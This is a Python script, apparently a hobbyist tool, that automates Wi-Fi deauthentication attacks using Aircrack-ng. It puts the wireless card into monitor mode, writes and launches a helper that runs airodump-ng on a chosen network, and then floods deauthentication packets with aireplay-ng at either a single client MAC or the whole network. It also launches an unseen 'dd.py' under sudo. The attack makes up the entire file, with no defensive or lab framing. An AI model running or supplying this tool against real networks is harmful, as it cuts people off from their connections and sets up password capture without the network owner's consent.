

### to run this you should have on your os  ' Aircrack-ng '### 
### you can get aircrack from thier own site www.aircrack-ng.org  ###
## i used airmon-ng and airodump-ng and aireply-ng you can find more about them in###
###www.aircrack-ng.org/doku.php?id=airmon-ng###
###www.aircrack-ng.org/doku.php?id=airodump-ng###
###www.aircrack-ng.org/doku.php?id=aireplay-ng###


import subprocess
import time
import os

interface = subprocess.call("airmon-ng")
print(interface)
#print("----------------[!]get the bissid and the ch num[!]------------------")
BSSID = None
ch = None

print("--------------------------------------")
print("[-]To stop montiring enter 's'[-]\n[+]To start montiring enter 'u'[+]")
acface = input('>')
if acface == ('s'):
	try:
		subprocess.call(["airmon-ng","stop","wlan0mon"])
	except:
		print('your interface already down !!')
if acface == ('u'):
	print("----------------[!]get the bissid and the ch [!]------------------")
	time.sleep(0.4)
	inmod =subprocess.call(["airmon-ng","start","wlan0"])
	print("[+] Starting Montering [+]")
print("--------------------------------------")
time.sleep(1.5)
print("[+]Press 'c' to send death to a Specific MAC  ,'q' to attck the whole wifi [+] ,")
order = input(" >> ")
os.system('gnome-terminal -- sudo python dd.py')
print("----------------[!]get the bissid and the ch num[!]------------------")
BSSID = input("Enter the [!] BSSID [!] of the network >")
print ("use "+BSSID+ " as the BSSID " )
ch = input("Enter the [!]-CH-[!] of the network >")
print ("use "+ ch +" as the channle ")
r = open("r.py","w")
r.write("import subprocess\nsubprocess.call(['airodump-ng','-c','{}','--bssid','{}','wlan0mon'])".format(ch,BSSID))
r.close()
if order == ("c"):
	
	os.system('gnome-terminal -- sudo python r.py')
	c = input("Enter the  Specific[!] MAC [!]")
	print ("use "+ c +" as the clinet ")
	death = subprocess.call(["aireplay-ng","-0","0","-a",BSSID,"-c",c,"wlan0mon"])
if order == ("q"):
	death = subprocess.call(["aireplay-ng","-0","0","-a",BSSID,"wlan0mon"])
	
